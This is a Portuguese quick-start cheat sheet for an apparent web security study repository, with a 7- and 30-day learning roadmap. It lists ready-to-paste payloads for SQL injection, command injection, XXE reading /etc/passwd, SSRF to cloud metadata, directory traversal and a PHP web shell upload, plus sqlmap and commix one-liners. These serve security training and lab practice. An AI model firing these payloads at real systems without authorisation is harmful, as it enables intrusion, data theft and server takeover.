# 🚀 QUICK START - Cheat Sheet Rápido

## 🎯 O Que Fazer Agora?

### 1️⃣ Primeiro Acesso
```
Abra: README.md
Tempo: 5 minutos
Objetivo: Entender estrutura do projeto
```

### 2️⃣ Aprender Vulnerabilidade Específica
```
Escolha uma: WEB/sqli.md, WEB/command-injection.md, etc.
Tempo: 30-60 minutos por vulnerabilidade
Objetivo: Exemplos práticos + mitigação
```

### 3️⃣ Usar como Referência de Teste
```
Abra: TESTING_GUIDE.md
Tempo: Conforme necessário
Objetivo: Payloads prontos para copiar/colar
```

---

## ⚡ Vulnerabilidades por Severidade

### 🔴 CRÍTICO (9.0-10.0)
| CVE | Tipo | Técnica | Tempo |
|---|---|---|---|
| 9.8 | SQLi | `' OR '1'='1` | 1min |
| 9.8 | Command | `; whoami` | 1min |

### 🟠 ALTO (7.0-8.9)
| CVE | Tipo | Técnica | Tempo |
|---|---|---|---|
| 8.8 | File Upload | `.phtml` bypass | 5min |
| 8.6 | XXE | DTD exploitation | 10min |
| 8.6 | SSRF | `127.0.0.1/admin` | 5min |
| 7.5 | Directory Traversal | `../../../etc/passwd` | 1min |
| 7.1 | WebSockets | CSRF injection | 10min |

---

## 🔍 Testes Rápidos (Copy & Paste)

### SQL Injection
```sql
' OR '1'='1
' OR 1=1--
' UNION SELECT username,password FROM users--
'; WAITFOR DELAY '00:00:05'--
```

### Command Injection
```bash
; whoami
| cat /etc/passwd
& ping -c 10 127.0.0.1
$(whoami)
```

### XXE
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

### SSRF
```
http://127.0.0.1/admin
http://169.254.169.254/latest/meta-data/
http://localhost:3306
```

### File Upload
```
shell.php
shell.phtml
shell.php%00.jpg
GIF89a<?php system($_GET['cmd']); ?>
```

### Directory Traversal
```
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
....//....//etc/passwd
```

---

## 🛠️ Ferramentas Essenciais (1 liner)

```bash
# Scan completo
zaproxy -cmd -quickurl http://target.com

# SQL Injection
sqlmap -u "http://target.com?id=1" --dbs

# Command Injection
commix -u "http://target.com?cmd=" -p cmd

# Directory brute force
dirb http://target.com /usr/share/dirb/wordlists/common.txt

# Port scanning
nmap -sV http://target.com

# Fuzzing
ffuf -w wordlist.txt -u http://target.com/FUZZ
```

---

## 📋 Checklist Pré-Teste

```
☐ Permissão por escrito obtida
☐ VPN/túnel configurado
☐ Burp Suite interceptando
☐ Escopo definido (IPs/domínios)
☐ Backup de dados feito (if applicable)
☐ Plano de rollback em caso de dano
☐ Contato de emergência disponível
```

---

## 🎓 Roadmap 7 Dias

**Dia 1:** SQL Injection
  - Leia WEB/sqli.md
  - Execute no HackTheBox PortSwigger Lab
  - Pratique 3 exemplos

**Dia 2:** Command Injection
  - Leia WEB/command-injection.md
  - Execute exploits
  - Crie script de teste

**Dia 3:** File Upload
  - Leia WEB/file-upload.md
  - Teste upload bypass
  - Crie polyglot

**Dia 4:** XXE & SSRF
  - Leia WEB/xxe.md + WEB/ssrf.md
  - Execute cloud metadata test
  - Teste SSRF chains

**Dia 5:** Directory Traversal & WebSockets
  - Leia WEB/directory-traversal.md + WEB/websockets.md
  - Teste traversal
  - Manipule WebSocket frames

**Dia 6:** Revisão
  - Compile notas
  - Crie seus próprios payloads
  - Teste em DVWA

**Dia 7:** Capstone
  - Teste aplicação completa
  - Documente descobertas
  - Crie relatório

---

## 🎯 Roadmap 30 Dias (Completo)

```
Semana 1: Fundamentos (HTTP, HTML, JS basics)
Semana 2: SQL & Database Security
Semana 3: Web Framework Security
Semana 4: Advanced Exploitation
Semana 5+: Capstone projects + CTFs
```

---

## 🔗 Links Mais Importantes

| Atividade | Link |
|---|---|
| Aprender | https://portswigger.net/web-security |
| Praticar | https://www.hackthebox.com |
| Referência | https://book.hacktricks.xyz |
| Ferramentas | https://portswigger.net/burp |
| Documentação | Consulte este repo |

---

## 🚨 Erros Comuns a Evitar

```
❌ Não fazer URL encode de payloads
❌ Esquecer de testar variações (maiúsculas, encoding)
❌ Assumir que há proteção sem testar
❌ Usar credenciais reais em teste
❌ Não documentar descobertas
```

---

## ✅ Dicas de Sucesso

```
✅ Comece simples, escale
✅ Teste cada tipo de vulnerabilidade
✅ Combine exploits (chain)
✅ Documente TUDO
✅ Pratique em labs
✅ Mantenha conhecimento atualizado
✅ Compartilhe descobertas responsavelmente
```

---

## 🆘 Quando Travar?

1. **Consultou a documentação?** → Arquivo WEB/*.md
2. **Tentou diferentes payloads?** → TESTING_GUIDE.md
3. **Verificou ferramentas?** → RESOURCES.md
4. **Testou em lab?** → HackTheBox / TryHackMe
5. **Ainda não?** → Abra uma Issue no GitHub

---

**Tempo estimado para dominar:** 4-6 semanas (estudo + prática)

**Próximo passo:** Abra [README.md](README.md) 🚀
